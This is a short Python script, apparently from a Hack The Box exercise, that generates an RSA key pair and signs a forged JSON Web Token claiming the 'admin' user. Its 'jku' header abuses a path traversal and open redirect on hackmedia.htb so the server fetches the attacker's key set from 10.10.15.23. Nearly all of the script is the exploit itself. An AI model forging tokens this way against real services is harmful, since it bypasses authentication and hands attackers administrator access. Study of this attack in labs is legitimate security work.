from jwcrypto import jwk, jwe
from jwcrypto.common import json_encode, json_decode

private_key=jwk.JWK.generate(kty='RSA', alg= 'RS256', size=4096)

print(private_key)

public_key= private_key.export(private_key=False)

print(public_key)

from jwcrypto import jwt

Token = jwt.JWT(header= {
	"alg": "RS256",
	"jku": "http://hackmedia.htb/static/../redirect/?url=10.10.15.23/jwks.json",
	"typ": "JWT"
	}, claims={
		"user": "admin"
	  })


Token = jwt.JWT(header= {"alg": "RS256", "jku": "http://hackmedia.htb/static/../redirect/?url=10.10.15.23/jwks.json?00", "typ": "JWT"
        }, claims={"user": "admin"})

print(Token)

Token.make_signed_token(private_key)
print(Token.serialize())
